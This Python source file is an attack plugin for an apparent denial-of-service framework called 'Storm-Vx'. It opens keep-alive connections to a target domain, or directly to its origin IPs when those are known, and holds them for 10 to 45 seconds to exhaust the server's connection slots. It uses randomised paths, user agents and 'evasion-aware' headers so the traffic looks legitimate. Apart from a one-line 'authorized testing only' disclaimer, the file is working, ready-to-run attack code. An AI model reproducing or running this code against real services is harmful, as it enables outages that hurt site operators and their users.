#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_conn_exhaust — Connection Exhaustion Attack Plugin (v24 P0)

Opens connections and holds them open with keep-alive, exhausting
the server's available connection slots.

v24: Now works BOTH with origin IPs AND directly against the target.
When no origin IPs are available, connects directly to the target domain.
Also improved with realistic request headers and varied hold patterns.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import ssl
import asyncio
import time
import random
from typing import Dict, Any
from urllib.parse import urlparse


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from tester.response_pipeline import RawConnectionPipeline
from vf_common import C, rand_str, random_ua
from config.defaults import RAW_CONNECT_TIMEOUT, WRITER_CLOSE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["ConnExhaustPlugin"]


class ConnExhaustPlugin(AttackPlugin):
    """Connection exhaustion attack (v24: works with or without origin IPs).

    Opens TCP connections with keep-alive and holds them open
    for extended periods. Each connection occupies a server
    slot, eventually exhausting the connection pool.

    v24: Can connect directly to target domain when no origin IPs available.
    """

    meta = PluginMeta(
        name='conn_exhaust',
        version='2.0.0',
        plugin_type='attack',
        description='Connection exhaustion — hold connections open (works with or without origin IPs)',
        tags=['origin', 'tcp', 'connection-exhaust', 'keep-alive'],
        priority=36,
        compatible_profiles=[],
        requirements=[],
    )

    def __init__(self) -> None:
        super().__init__()
        # S1a: SSL context will be created per-run based on verify_ssl setting
        self._ssl_ctx = None  # Set in _worker_loop from context

    def _create_response_pipeline(self):
        """BUG-016 FIX: Use RawConnectionPipeline for TCP-based conn_exhaust."""
        return RawConnectionPipeline(
            target_selector=self._target_selector,
            pacer=self._pacer,
            context=self._context,
        )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Connection exhaustion worker: hold connections open."""
        origin_ips = context.origin_ips
        domain = context.domain
        target_is_https = urlparse(context.url).scheme == 'https'
        # B1 FIX: Use shared SSL context helper instead of duplicated code
        ssl_ctx = self._create_ssl_context(context)
        use_tls = ssl_ctx is not None

        # v24: Determine connection targets
        use_origin = bool(origin_ips)

        while not self._stop_event.is_set():
            try:
                if use_origin:
                    target_host = random.choice(origin_ips)
                else:
                    target_host = domain

                port = 443 if use_tls else 80
                try:
                    if use_tls:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(
                                target_host, port, ssl=ssl_ctx, server_hostname=domain),
                            timeout=RAW_CONNECT_TIMEOUT)  # W2.4
                    else:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(target_host, port),
                            timeout=RAW_CONNECT_TIMEOUT)  # W2.4

                    try:
                        # v25 P1: Use evasion-aware headers for more realistic request
                        path = random.choice(["/", f"/{rand_str(4)}", f"/api/{rand_str(3)}"])
                        headers = self._get_fresh_headers(context, "document")
                        req = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {domain}\r\n"
                            f"User-Agent: {headers.get('User-Agent', random_ua())}\r\n"
                            f"Accept: {headers.get('Accept', '*/*')}\r\n"
                            f"Connection: keep-alive\r\n\r\n"
                        )
                        writer.write(req.encode())
                        await writer.drain()

                        # v26: Record task IMMEDIATELY after successful connection + request
                        # (prevents t:0 if attack auto-shrinks before hold completes)
                        await self._record("CONN-HOLD", True, 0, 0, hint="hold")
                        self._on_request_result(worker_id, True)
                        # BUG-016 FIX: Process through RawConnectionPipeline
                        self._response_pipeline.process(success=True, url=context.url, worker_id=worker_id)

                        # v24: Varied hold duration (10-45 seconds)
                        hold_duration = random.uniform(10, 45)
                        await asyncio.sleep(hold_duration)
                    finally:
                        # Always close the writer to prevent resource leaks
                        writer.close()
                        try:
                            await asyncio.wait_for(writer.wait_closed(), timeout=WRITER_CLOSE_TIMEOUT)  # W2.4
                        except (OSError, RuntimeError, ConnectionError, asyncio.TimeoutError):
                            pass  # Cleanup errors are acceptable
                except asyncio.CancelledError:
                    raise
                except (OSError, ConnectionError, asyncio.TimeoutError, ssl.SSLError) as exc:
                    await self._record("CONN-HOLD", False, 0, 0, err=type(exc).__name__)
                    self._on_request_result(worker_id, False)
                    # BUG-016 FIX: Process through RawConnectionPipeline
                    self._response_pipeline.process(success=False, url=context.url, worker_id=worker_id, error_type=type(exc).__name__)
            except asyncio.CancelledError:
                return
            except (OSError, ConnectionError, asyncio.TimeoutError) as exc:
                logger.debug(f"Conn exhaust worker {worker_id} outer error: {exc}")
                await asyncio.sleep(1)


